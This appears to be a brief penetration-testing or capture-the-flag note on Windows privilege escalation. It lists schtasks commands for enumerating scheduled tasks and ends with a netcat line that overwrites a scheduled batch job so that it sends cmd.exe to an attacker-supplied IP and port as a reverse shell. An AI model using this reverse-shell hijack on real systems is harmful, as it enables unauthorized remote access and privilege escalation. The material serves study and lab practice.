
Command Prompt:

`schtasks /query`

`schtasks /query /FO LIST /v`         (to list all the scheduled tasks)

`schtasks /query /fo LIST | findstr /B "TaskName:"`      (To list only the TaskName)

Sometimes it won't retrieve any tasks, as we have low privilege access, it requires High privilege or Administrative access to list tasks.

Netcat command to gain reverse shell access:

`echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\LogManagement\job.bat`